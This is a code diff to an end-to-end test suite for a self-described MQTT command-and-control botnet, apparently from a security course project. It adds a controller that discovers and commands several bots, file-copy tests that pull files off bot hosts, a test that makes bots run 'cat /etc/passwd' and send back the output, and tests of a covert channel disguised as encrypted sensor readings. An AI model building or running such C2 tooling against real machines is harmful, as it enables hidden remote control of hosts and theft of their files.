@@ -2,7 +2,7 @@
 End-to-end tests for the MQTT C&C botnet with layered protocol stack.
 Assumes the MQTT broker is running on 127.0.0.1:1883.
 
-The tests automatically launch and teardown the bot process.
+The tests automatically launch and teardown 3 bot processes.
 
 Run with: pytest test_e2e.py -v
 """
@@ -32,6 +32,7 @@ BROKER = "127.0.0.1"
 PORT = 1883
 TOPIC = "sensors"
 SALT = DEFAULT_SALT
+NUM_BOTS = 3  # Number of bots to spawn for testing
 
 # Path to the bot script
 SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
@@ -40,13 +41,14 @@ VENV_PYTHON = os.path.join(SCRIPT_DIR, "venv", "bin", "python")
 PYTHON_EXECUTABLE = VENV_PYTHON if os.path.exists(VENV_PYTHON) else sys.executable
 
 
-class TestClient:
+class TestClientHelper:
     """Test client using the protocol stack."""
     
     def __init__(self, client_id="test_controller_001"):
         self.client_id = client_id
         self.responses = queue.Queue()
         self.all_messages = queue.Queue()
+        self.discovered_bots = set()
         
         self.stack = ProtocolStack(
             node_id=client_id,
@@ -61,6 +63,10 @@ class TestClient:
     def _on_message(self, message: dict):
         """Handle incoming messages."""
         self.all_messages.put(message)
+        
+        sender = message.get("sender", "")
+        if sender.startswith("sensor_") and not sender.endswith("1"):
+            self.discovered_bots.add(sender)
         
         if message.get("type") == "response" and message.get("target") == self.client_id:
             self.responses.put(message)
@@ -83,6 +89,18 @@ class TestClient:
         except queue.Empty:
             return None
     
+    def wait_for_responses(self, count: int, timeout: float = 15) -> list:
+        """Wait for multiple responses."""
+        responses = []
+        deadline = time.time() + timeout
+        while len(responses) < count and time.time() < deadline:
+            try:
+                resp = self.responses.get(timeout=0.5)
+                responses.append(resp)
+            except queue.Empty:
+                continue
+        return responses
+    
     def clear_queues(self):
         """Clear pending messages."""
         while not self.responses.empty():
@@ -98,9 +116,10 @@ class TestClient:
 
 
 @pytest.fixture(scope="session")
-def bot_process():
-    """Launch the bot process for the test session."""
-    bot_test_script = os.path.join(SCRIPT_DIR, "_test_bot.py")
+def bot_processes():
+    """Launch multiple bot processes for the test session."""
+    processes = []
+    test_scripts = []
     
     # Read and modify bot script for testing
     with open(BOT_SCRIPT, 'r') as f:
@@ -109,35 +128,43 @@ def bot_process():
     # Replace broker for localhost testing
     bot_code = bot_code.replace('BROKER = "147.32.82.209"', 'BROKER = "127.0.0.1"')
     
-    with open(bot_test_script, 'w') as f:
-        f.write(bot_code)
+    for i in range(NUM_BOTS):
+        bot_test_script = os.path.join(SCRIPT_DIR, f"_test_bot_{i}.py")
+        test_scripts.append(bot_test_script)
+        
+        with open(bot_test_script, 'w') as f:
+            f.write(bot_code)
+        
+        # Launch bot
+        proc = subprocess.Popen(
+            [PYTHON_EXECUTABLE, bot_test_script],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            cwd=SCRIPT_DIR
+        )
+        processes.append(proc)
     
-    # Launch bot
-    proc = subprocess.Popen(
-        [PYTHON_EXECUTABLE, bot_test_script],
-        stdout=subprocess.PIPE,
-        stderr=subprocess.PIPE,
-        cwd=SCRIPT_DIR
-    )
+    time.sleep(4)  # Wait for all bots to initialize
     
-    time.sleep(3)  # Wait for bot to initialize with protocol stack
+    yield processes
     
-    yield proc
+    # Cleanup
+    for proc in processes:
+        proc.terminate()
+        try:
+            proc.wait(timeout=5)
+        except subprocess.TimeoutExpired:
+            proc.kill()
     
-    proc.terminate()
-    try:
-        proc.wait(timeout=5)
-    except subprocess.TimeoutExpired:
-        proc.kill()
-    
-    if os.path.exists(bot_test_script):
-        os.remove(bot_test_script)
+    for script in test_scripts:
+        if os.path.exists(script):
+            os.remove(script)
 
 
 @pytest.fixture
-def test_client(bot_process):
+def test_client(bot_processes):
     """Provide a connected test client."""
-    client = TestClient()
+    client = TestClientHelper()
     client.connect()
     client.clear_queues()
     yield client
@@ -148,20 +175,22 @@ class TestBasicCommands:
     """Tests for basic commands."""
     
     def test_ping_command(self, test_client):
-        """Test ping returns Pong."""
+        """Test ping returns Pong from all bots."""
         test_client.send_command("ALL", "ping")
-        response = test_client.wait_for_response(timeout=10)
+        responses = test_client.wait_for_responses(count=NUM_BOTS, timeout=15)
         
-        assert response is not None, "Should receive response"
-        assert response["output"] == "Pong"
+        assert len(responses) >= 1, "Should receive at least one response"
+        for resp in responses:
+            assert resp["output"] == "Pong"
     
     def test_id_command(self, test_client):
         """Test id command."""
         test_client.send_command("ALL", "id")
-        response = test_client.wait_for_response(timeout=10)
+        responses = test_client.wait_for_responses(count=NUM_BOTS, timeout=15)
         
-        assert response is not None
-        assert "uid=" in response["output"]
+        assert len(responses) >= 1
+        for resp in responses:
+            assert "uid=" in resp["output"]
     
     def test_w_command(self, test_client):
         """Test w command."""
@@ -196,6 +225,51 @@ class TestBasicCommands:
         assert "Unknown Cmd" in response["output"]
 
 
+class TestMultipleBots:
+    """Tests with multiple bots."""
+    
+    def test_all_bots_respond_to_ping(self, test_client):
+        """All bots should respond to ping."""
+        test_client.send_command("ALL", "ping")
+        responses = test_client.wait_for_responses(count=NUM_BOTS, timeout=20)
+        
+        assert len(responses) == NUM_BOTS, f"Expected {NUM_BOTS} responses, got {len(responses)}"
+        
+        # All responses should be Pong
+        for resp in responses:
+            assert resp["output"] == "Pong"
+        
+        # All responses should be from different bots
+        senders = set(resp["sender"] for resp in responses)
+        assert len(senders) == NUM_BOTS, f"Expected {NUM_BOTS} unique senders"
+    
+    def test_discover_multiple_bots(self, test_client):
+        """Discovered bots set should have all bots."""
+        test_client.send_command("ALL", "ping")
+        test_client.wait_for_responses(count=NUM_BOTS, timeout=20)
+        
+        assert len(test_client.discovered_bots) == NUM_BOTS
+    
+    def test_target_specific_bot(self, test_client):
+        """Target a specific bot, only that bot should respond."""
+        # First discover bots
+        test_client.send_command("ALL", "ping")
+        test_client.wait_for_responses(count=NUM_BOTS, timeout=20)
+        
+        assert len(test_client.discovered_bots) >= 1
+        target_bot = list(test_client.discovered_bots)[0]
+        
+        # Clear and send to specific bot
+        test_client.clear_queues()
+        test_client.send_command(target_bot, "ping")
+        
+        # Should only get one response
+        responses = test_client.wait_for_responses(count=3, timeout=10)
+        
+        assert len(responses) == 1, f"Expected 1 response, got {len(responses)}"
+        assert responses[0]["sender"] == target_bot
+
+
 class TestFileCopy:
     """Tests for file copy command."""
     
@@ -225,7 +299,6 @@ class TestFileCopy:
     
     def test_copy_large_file(self, test_client):
         """Test copying a large file that requires chunking."""
-        # Create a 10KB file
         large_content = "X" * 10000 + "\nEND_MARKER"
         
         with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt') as f:
@@ -234,7 +307,6 @@ class TestFileCopy:
         
         try:
             test_client.send_command("ALL", "copy", temp_path)
-            # Large files need more time due to chunking
             response = test_client.wait_for_response(timeout=30)
             
             assert response is not None, "Should receive response for large file"
@@ -245,7 +317,6 @@ class TestFileCopy:
     
     def test_copy_very_large_file(self, test_client):
         """Test copying a very large file (50KB+)."""
-        # Create a 50KB file with identifiable content
         content_parts = [f"LINE_{i:05d}:" + "Y" * 100 + "\n" for i in range(500)]
         large_content = "".join(content_parts)
         
@@ -255,12 +326,10 @@ class TestFileCopy:
         
         try:
             test_client.send_command("ALL", "copy", temp_path)
-            # Very large files need even more time
             response = test_client.wait_for_response(timeout=120)
             
             assert response is not None, "Should receive response for very large file"
             assert "FILE_START:" in response["output"]
-            # Check first and last lines are present
             assert "LINE_00000:" in response["output"], "Should have first line"
             assert "LINE_00499:" in response["output"], "Should have last line"
         finally:
@@ -304,9 +373,6 @@ class TestProtocolStack:
     
     def test_compression_reduces_size(self):
         """Test that compression reduces payload size."""
-        import zlib
-        
-        # Repetitive content compresses well
         original = "AAAA" * 1000
         compressed = zlib.compress(original.encode(), level=6)
         
@@ -315,7 +381,6 @@ class TestProtocolStack:
     
     def test_encrypt_decrypt_roundtrip(self):
         """Test encryption/decryption roundtrip."""
-        # Simulate the encryption layer
         salt = DEFAULT_SALT
         data = {
             "sensor_id": "test",
@@ -324,7 +389,6 @@ class TestProtocolStack:
             "bat": 100
         }
         
-        # Derive key
         raw_str = (salt + str(data.get("sensor_id", "")) + 
                    str(data.get("temp", "")) + 
                    str(data.get("hum", "")) + 
@@ -332,14 +396,12 @@ class TestProtocolStack:
         md5_hash = hashlib.md5(raw_str.encode()).digest()
         key = md5_hash + md5_hash
         
-        # Encrypt
         plaintext = "Test message for encryption"
         iv = get_random_bytes(16)
         cipher = AES.new(key, AES.MODE_CBC, iv)
         ciphertext = cipher.encrypt(pad(plaintext.encode(), AES.block_size))
         encrypted_hex = (iv + ciphertext).hex()
         
-        # Decrypt
         encrypted_data = bytes.fromhex(encrypted_hex)
         iv2 = encrypted_data[:16]
         ciphertext2 = encrypted_data[16:]
@@ -347,6 +409,51 @@ class TestProtocolStack:
         decrypted = unpad(cipher2.decrypt(ciphertext2), AES.block_size).decode()
         
         assert decrypted == plaintext
+    
+    def test_fingerprint_size_stays_constant(self):
+        """Test that fingerprint size stays constant for same-size payloads."""
+        from protocol import EncryptionLayer
+        
+        encryption = EncryptionLayer(node_id="test_node", salt=DEFAULT_SALT)
+        
+        # Create multiple payloads of similar size
+        payloads = [
+            {"msg_id": "abc12345", "seq": 0, "total": 1, "data": "X" * 100},
+            {"msg_id": "def67890", "seq": 0, "total": 1, "data": "Y" * 100},
+            {"msg_id": "ghi11111", "seq": 0, "total": 1, "data": "Z" * 100},
+        ]
+        
+        fingerprint_sizes = []
+        for payload in payloads:
+            # Create sensor data and encrypt
+            sensor_data = encryption._create_sensor_data()
+            key = encryption._derive_key(sensor_data)
+            fingerprint = encryption._encrypt(json.dumps(payload), key)
+            fingerprint_sizes.append(len(fingerprint))
+        
+        # All fingerprints should be the same size
+        assert len(set(fingerprint_sizes)) == 1, \
+            f"Fingerprint sizes should be constant, got {fingerprint_sizes}"
+    
+    def test_fingerprint_size_varies_with_payload_size(self):
+        """Test that fingerprint size varies appropriately with payload size."""
+        from protocol import EncryptionLayer
+        
+        encryption = EncryptionLayer(node_id="test_node", salt=DEFAULT_SALT)
+        
+        # Create payloads of different sizes
+        small_payload = {"data": "X" * 10}
+        large_payload = {"data": "Y" * 1000}
+        
+        sensor_data = encryption._create_sensor_data()
+        key = encryption._derive_key(sensor_data)
+        
+        small_fingerprint = encryption._encrypt(json.dumps(small_payload), key)
+        large_fingerprint = encryption._encrypt(json.dumps(large_payload), key)
+        
+        # Large payload should produce larger fingerprint
+        assert len(large_fingerprint) > len(small_fingerprint), \
+            "Larger payload should produce larger fingerprint"
 
 
 class TestChunking:
@@ -357,18 +464,15 @@ class TestChunking:
         test_client.send_command("ALL", "ping")
         response = test_client.wait_for_response(timeout=10)
         
-        # Ping response is small, should work fine
         assert response is not None
         assert response["output"] == "Pong"
     
     def test_large_response_multi_chunk(self, test_client):
         """Large responses should be chunked and reassembled."""
-        # Use exec to generate large output
         test_client.send_command("ALL", "exec", "cat /etc/passwd")
         response = test_client.wait_for_response(timeout=15)
         
         assert response is not None
-        # /etc/passwd should have root entry
         assert "root" in response["output"]
 
 
